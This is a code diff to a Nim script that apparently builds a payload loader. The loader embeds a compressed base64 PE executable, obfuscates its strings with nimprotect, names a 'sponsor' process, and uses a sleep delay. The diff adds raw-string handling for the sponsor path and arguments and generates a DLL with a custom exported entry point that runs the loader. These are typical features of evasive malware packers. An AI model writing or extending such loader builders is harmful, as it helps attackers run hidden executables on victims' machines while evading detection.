@@ -99,7 +99,7 @@ when isMainModule:
         if opts.sponsor == "":
             sponsorPath = "getAppFilename()"
         else:
-            sponsorPath = "protectString(\"" & opts.sponsor & "\")"        
+            sponsorPath = "protectString(r\"" & opts.sponsor & "\")"        
         sponsorParams = opts.args
         outFormat = opts.format
         outDllExportName = opts.export
@@ -128,7 +128,7 @@ import nimprotect
 
 var compressedBase64PE* = protectString("{compressedBase64PE}")
 var sponsorPath* = {sponsorPath}
-var sponsorParams* = protectString(" {sponsorParams}")
+var sponsorParams* = protectString(r" {sponsorParams}")
 var dllExportName* = protectString("{outDllExportName}") 
 var sleepSeconds* = {sleepSeconds}
     """
@@ -155,6 +155,19 @@ var sleepSeconds* = {sleepSeconds}
     if outFormat == "exe":
         compileCmd = compileExeCmd & compileFlags & compileOutExe & compileExePath
     elif outFormat == "dll":
+        # Write the dll file that contains the export function
+        var nimDllPath = "Loader/dll.nim"
+        var nimDllcontent = fmt"""
+import main
+import params
+
+proc NimMain() {{.cdecl, importc.}}
+
+proc {outDllExportName}(): void {{.stdcall, exportc, dynlib.}} =
+    NimMain()
+    main()
+        """
+        writeFile(nimDllPath, nimDllcontent)
         compileCmd = compileDllCmd & compileFlags & compileOutDll & compileDllPath
     echo "[*] Compiling Loader: " & compileCmd
     var res = execCmdEx(compileCmd, options={poStdErrToStdOut})
